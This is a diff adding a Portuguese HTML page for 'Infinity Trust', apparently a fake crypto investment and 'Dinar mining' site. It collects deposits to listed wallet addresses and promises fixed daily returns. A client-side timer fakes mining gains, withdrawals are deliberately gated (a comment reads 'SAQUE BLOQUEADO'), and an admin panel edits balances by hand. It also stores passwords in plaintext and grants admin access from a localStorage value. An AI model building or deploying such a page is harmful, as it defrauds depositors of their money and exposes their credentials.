@@ -1,0 +1,304 @@
+<!DOCTYPE html><html lang="pt"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Infinity Trust</title>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDKk0CyCeQ8bGhx_6jZv_hxzeAXgYFq6gw",
+  authDomain: "dinar-cd2fd.firebaseapp.com",
+  databaseURL: "https://dinar-cd2fd-default-rtdb.firebaseio.com",
+  projectId: "dinar-cd2fd",
+  storageBucket: "dinar-cd2fd.firebasestorage.app",
+  messagingSenderId: "980207226370",
+  appId: "1:980207226370:web:9983cff0462774f523e11b"
+};
+
+firebase.initializeApp(firebaseConfig);
+var db = firebase.database();
+</script>
+
+<style>*{margin:0;padding:0;box-sizing:border-box}body{width:100%;height:100vh;background:#0a0f1c;font-family:Arial;color:#fff}.tela{width:100%;height:100vh;display:flex;justify-content:center;align-items:center;flex-direction:column}.box{width:90%;max-width:400px;background:#111a2e;padding:25px;border-radius:12px;box-shadow:0 0 20px #0d6efd}h2{text-align:center;color:#0d6efd;margin-bottom:15px}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:6px;background:#1c2b4a;color:#fff}button{width:100%;padding:12px;background:#0d6efd;border:none;border-radius:6px;color:#fff;font-size:16px;cursor:pointer;margin-top:5px}.link{text-align:center;margin-top:12px;color:#0d6efd;cursor:pointer}.topo{width:100%;padding:15px;background:#111a2e;text-align:center;font-size:20px;color:#0d6efd}.painel{flex:1;padding:20px;text-align:center;width:100%}.acoes{display:flex;gap:15px;margin:20px 0}.acoes button{flex:1}.rodape{position:fixed;bottom:0;width:100%;background:#111a2e;display:flex;justify-content:space-around;padding:12px 0}.rodape div{color:#0d6efd;font-size:14px;cursor:pointer}.dinar{margin-top:30px}.dinar img{width:120px;height:120px;border-radius:50%;box-shadow:0 0 20px gold}.quadro{margin-top:15px;background:#111a2e;padding:15px;border-radius:12px;box-shadow:0 0 15px #0d6efd;text-align:left}.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:15px}.coin{background:#1c2b4a;padding:10px;border-radius:10px}.coin img{width:40px}.aviso{color:red;margin-top:15px;font-size:14px;text-align:center}.saldo{font-size:18px;margin-bottom:15px}.historico{font-size:14px;margin-top:10px;border-top:1px solid #0d6efd;padding-top:5px;text-align:left}</style></head><body>
+
+<div class="tela" id="cadastro"><div class="box"><h2>Cadastro</h2><input type="text" id="nome" placeholder="Nome completo"><input type="number" id="numero" placeholder="Número"><input type="password" id="senha" placeholder="Palavra-passe"><input type="password" id="confirmar" placeholder="Confirmar palavra-passe"><button onclick="cadastrar()">Cadastrar</button><div class="link" onclick="irLogin()">Já tenho conta? Login</div></div></div>
+
+<div class="tela" id="login" style="display:none"><div class="box"><h2>Login</h2><input type="number" id="loginNumero" placeholder="Número"><input type="password" id="loginSenha" placeholder="Palavra-passe"><button onclick="entrar()">Entrar</button><div class="link" onclick="irCadastro()">Criar conta</div></div></div>
+
+<div id="painel" style="display:none;height:100vh;flex-direction:column">
+<div class="topo">Infinity Trust</div>
+<div class="painel">
+<h3>Bem-vindo 🚀</h3>
+<p id="info"></p>
+
+<div class="acoes">
+<button id="btnRecarregar">Recarregar</button>
+<button onclick="verificarSaque()">Sacar</button>
+</div>
+
+<div class="dinar"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png"></div>
+
+<div class="quadro"><div class="grid">
+<div class="coin"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png"></div>
+<div class="coin"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png"></div>
+<div class="coin"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"></div>
+<div class="coin"><img src="https://cryptologos.cc/logos/dogecoin-doge-logo.png"></div>
+<div class="coin"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png"></div>
+<div class="coin"><img src="https://cryptologos.cc/logos/solana-sol-logo.png"></div>
+</div></div>
+
+<div class="quadro"><div class="grid">
+<div class="coin"><img src="https://cdn-icons-png.flaticon.com/512/555/555526.png"></div>
+<div class="coin"><img src="https://cdn-icons-png.flaticon.com/512/555/555526.png"></div>
+<div class="coin"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png"></div>
+<div class="coin"><img src="https://cdn-icons-png.flaticon.com/512/555/555526.png"></div>
+<div class="coin"><img src="https://cdn-icons-png.flaticon.com/512/555/555526.png"></div>
+<div class="coin"><img src="https://cdn-icons-png.flaticon.com/512/555/555526.png"></div>
+</div></div>
+</div>
+
+<div class="rodape">
+<div>🏠 Início</div>
+<div>💰 Dinar</div>
+<div id="btnInvestimento">📈 Investimento</div>
+<div id="btnCarteira">👛 Carteira</div>
+</div>
+</div>
+
+<div class="tela" id="minerar" style="display:none;flex-direction:column">
+<div class="topo">Minerar Dinar</div>
+<div class="painel">
+<h3>Minerando Dinar 🚀</h3>
+<p id="mineracao">Você tem: 0 Dinar</p>
+<p>Mineração: 142 Dinar por dia</p>
+<button id="iniciarMineracao">Iniciar Mineração</button>
+<button onclick="voltarPainel()">Voltar</button>
+</div></div>
+
+<div class="tela" id="recarregar" style="display:none;flex-direction:column">
+<div class="topo">Recarregar</div>
+<div class="painel">
+<div class="quadro"><p>BNB Smart chain BP20:<br>0x78235f5e15093cb05d6352ac7c1bb26192005c71</p></div>
+<div class="quadro"><p>TRON TRC20:<br>TLcw4BQ5NBGCNeq8oMB3YY4hphLrZ9RbdC</p></div>
+<div class="quadro"><p>Polygon POS:<br>0x78235f5e15093cb05d6352ac7c1bb26192005c71</p></div>
+<div class="aviso">⚠ Envie seu dinheiro apenas para o endereço correto!</div>
+<button onclick="voltarPainelRecarregar()">Voltar</button>
+</div></div>
+
+<div class="tela" id="investimento" style="display:none;flex-direction:column">
+<div class="topo">Investimentos</div>
+<div class="painel">
+<div class="quadro"><p>Investimento 1<br>Dinar<br>1000 USD<br>Ganho diário:142 Dinar<br>Duração: 2 meses</p><button onclick="investir(1000,142)">Investir</button></div>
+<div class="quadro"><p>Investimento 2<br>2000 USD<br>Ganho diário:242 Dinar<br>Duração: 2 meses</p><button onclick="investir(2000,242)">Investir</button></div>
+<div class="quadro"><p>Investimento 3<br>3000 USD<br>Ganho diário:342 Dinar<br>Duração: 2 meses</p><button onclick="investir(3000,342)">Investir</button></div>
+<div class="quadro"><p>Investimento 4<br>4000 USD<br>Ganho diário:442 Dinar<br>Duração: 2 meses</p><button onclick="investir(4000,442)">Investir</button></div>
+<div class="quadro"><p>Investimento 5<br>5000 USD<br>542 Dinar<br>Duração: 2 meses</p><button onclick="investir(5000,542)">Investir</button></div>
+<button onclick="voltarPainelInvestimento()">Voltar</button>
+</div></div>
+
+<div class="tela" id="carteira" style="display:none;flex-direction:column">
+<div class="topo">Carteira</div>
+<div class="painel">
+<div class="quadro saldo" id="saldoCarteira">Saldo: 0 Dinar | 0 USD</div>
+<div class="quadro"><p>Histórico de Saques:</p><div id="historicoSaque" class="historico">Nenhum saque</div></div>
+<div class="quadro"><p>Histórico de Ganhos:</p><div id="historicoGanho" class="historico">Nenhum ganho</div></div>
+<button onclick="voltarPainelCarteira()">Voltar</button>
+</div></div>
+
+<script>
+function irLogin(){cadastro.style.display="none";login.style.display="flex"}
+function irCadastro(){login.style.display="none";cadastro.style.display="flex"}
+function cadastrar(){
+let n=nome.value,num=numero.value,s=senha.value,c=confirmar.value;
+
+if(!n||!num||!s||!c)return alert("Preencha todos os campos!");
+if(s!=c)return alert("As palavras-passe não coincidem!");
+
+db.ref("usuarios/"+num).set({
+nome:n,
+numero:num,
+senha:s,
+saldoDinar:0,
+saldoUSD:0,
+historicoSaque:[],
+historicoGanho:[]
+}).then(()=>{
+alert("Cadastro feito com sucesso!");
+irLogin();
+});
+}
+function entrar(){
+let num = loginNumero.value;
+let s = loginSenha.value;
+
+db.ref("usuarios/" + num).once("value").then(snapshot => {
+
+let u = snapshot.val();
+
+if(!u){
+alert("Nenhuma conta encontrada!");
+return;
+}
+
+if(u.senha == s){
+
+localStorage.setItem("usuarioAtual", num);
+
+login.style.display = "none";
+painel.style.display = "flex";
+
+info.innerHTML = "Número: " + u.numero + "<br>Nome: " + u.nome;
+
+verificarAdmin();
+
+}else{
+alert("Dados incorretos!");
+}
+
+});
+}
+
+let diner=0,mineracaoInterval;
+document.querySelector(".rodape div:nth-child(2)").onclick=function(){painel.style.display="none";minerar.style.display="flex";document.getElementById("mineracao").innerText="Você tem: "+diner+" Dinar";clearInterval(mineracaoInterval)};
+document.getElementById("iniciarMineracao").onclick=function(){mineracaoInterval=setInterval(function(){diner+=142;document.getElementById("mineracao").innerText="Você tem: "+diner+" Dinar"},1e4)};
+function voltarPainel(){minerar.style.display="none";painel.style.display="flex";clearInterval(mineracaoInterval)}
+
+document.getElementById("btnRecarregar").onclick=function(){painel.style.display="none";recarregar.style.display="flex"}
+function voltarPainelRecarregar(){recarregar.style.display="none";painel.style.display="flex"}
+
+document.getElementById("btnInvestimento").onclick=function(){painel.style.display="none";investimento.style.display="flex"}
+function voltarPainelInvestimento(){investimento.style.display="none";painel.style.display="flex"}
+
+document.getElementById("btnCarteira").onclick=function(){painel.style.display="none";carteira.style.display="flex";atualizaCarteira()}
+function voltarPainelCarteira(){carteira.style.display="none";painel.style.display="flex"}
+
+function atualizaCarteira(){
+
+let num=localStorage.getItem("usuarioAtual");
+
+db.ref("usuarios/"+num).once("value").then(snapshot=>{
+
+let u=snapshot.val();
+
+if(!u)return;
+
+saldoCarteira.innerText="Saldo: "+u.saldoDinar+" Dinar | "+u.saldoUSD+" USD";
+
+historicoSaque.innerText=
+u.historicoSaque&&u.historicoSaque.length?
+u.historicoSaque.join("\n"):
+"Nenhum saque";
+
+historicoGanho.innerText=
+u.historicoGanho&&u.historicoGanho.length?
+u.historicoGanho.join("\n"):
+"Nenhum ganho";
+
+});
+}
+
+function investir(valorUSD,ganhoDinar){let u=JSON.parse(localStorage.getItem("usuario"));if(u.saldoUSD>=valorUSD){u.saldoUSD-=valorUSD;u.historicoGanho.push("Investido "+valorUSD+" USD - Ganho diário: "+ganhoDinar);localStorage.setItem("usuario",JSON.stringify(u));alert("Investimento realizado!");atualizaCarteira()}else alert("Saldo insuficiente!")}
+/* 🔥 ADIÇÃO: SAQUE BLOQUEADO */
+function verificarSaque(){
+let u=JSON.parse(localStorage.getItem("usuario"));
+if(!u)return alert("Nenhuma conta encontrada!");
+
+if(u.saldoUSD>100){
+painel.style.display="none";
+sacar.style.display="flex";
+}else{
+alert("❌ Precisas de mais de 100 USD para sacar");
+}
+}
+const ADMIN_ID = "929928993";
+
+// criar botão admin no painel automaticamente
+function verificarAdmin(){
+let num = localStorage.getItem("usuarioAtual");
+
+if(num === ADMIN_ID){
+let btn = document.createElement("button");
+btn.innerText = "🔧 Painel Admin";
+btn.style.marginTop = "10px";
+btn.onclick = abrirAdmin;
+document.querySelector(".painel").appendChild(btn);
+}
+}
+
+function abrirAdmin(){
+painel.style.display="none";
+
+let div = document.createElement("div");
+div.id = "admin";
+div.className = "tela";
+div.style.display = "flex";
+div.style.flexDirection = "column";
+div.innerHTML = `
+<div class="topo">Painel Admin</div>
+<div class="painel">
+<h3>Usuários</h3>
+<div id="listaUsers"></div>
+<button onclick="fecharAdmin()">Voltar</button>
+</div>
+`;
+
+document.body.appendChild(div);
+carregarUsers();
+}
+
+function fecharAdmin(){
+document.getElementById("admin").remove();
+painel.style.display="flex";
+}
+
+function carregarUsers(){
+db.ref("usuarios").once("value").then(snap=>{
+let data = snap.val();
+let html = "";
+
+for(let id in data){
+html += `
+<div class="quadro">
+<p>📱 ${data[id].numero}</p>
+<p>👤 ${data[id].nome}</p>
+
+<input id="usd-${id}" placeholder="Adicionar USD">
+<input id="dinar-${id}" placeholder="Adicionar Dinar">
+
+<button onclick="addSaldo('${id}')">Atualizar saldo</button>
+<button onclick="deleteUser('${id}')">Eliminar</button>
+</div>
+`;
+}
+
+document.getElementById("listaUsers").innerHTML = html;
+});
+}
+
+function addSaldo(id){
+
+let usd = parseFloat(document.getElementById("usd-"+id).value) || 0;
+let dinar = parseFloat(document.getElementById("dinar-"+id).value) || 0;
+
+db.ref("usuarios/"+id).once("value").then(snap=>{
+let u = snap.val();
+
+u.saldoUSD = (u.saldoUSD || 0) + usd;
+u.saldoDinar = (u.saldoDinar || 0) + dinar;
+
+db.ref("usuarios/"+id).update(u).then(()=>{
+alert("Saldo atualizado!");
+carregarUsers();
+});
+});
+}
+
+function deleteUser(id){
+db.ref("usuarios/"+id).remove().then(()=>{
+alert("Usuário eliminado!");
+carregarUsers();
+});
+}
+</script>
+
+</body></html>
+
